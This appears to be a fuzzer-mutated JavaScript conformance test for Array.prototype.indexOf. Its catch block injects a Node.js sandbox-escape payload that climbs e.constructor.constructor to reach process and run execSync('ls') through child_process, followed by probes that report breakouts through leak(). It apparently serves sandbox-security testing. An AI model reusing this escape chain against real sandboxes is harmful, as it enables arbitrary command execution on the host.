try {
    var toStringAccessed = false;
    var valueOfAccessed = false;
    var proto = {
        valueOf: function () {
            let REPLACER = 23;
            valueOfAccessed = true;
            return 1;
        }
    };
    var Con = function () {
        let REPLACER = 23;
    };
    Con.prototype = proto;
    var child = new Con();
    child.toString = function () {
        throw () => {
            return () => {
            };
        };
        toStringAccessed = true;
        return 2;
    };
    assert.sameValue([
        0,
        true
    ].indexOf(true, child), 1, '[0, true].indexOf(true, child)');
    assert(valueOfAccessed, 'valueOfAccessed !== true');
    assert.sameValue(toStringAccessed, false, 'toStringAccessed');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}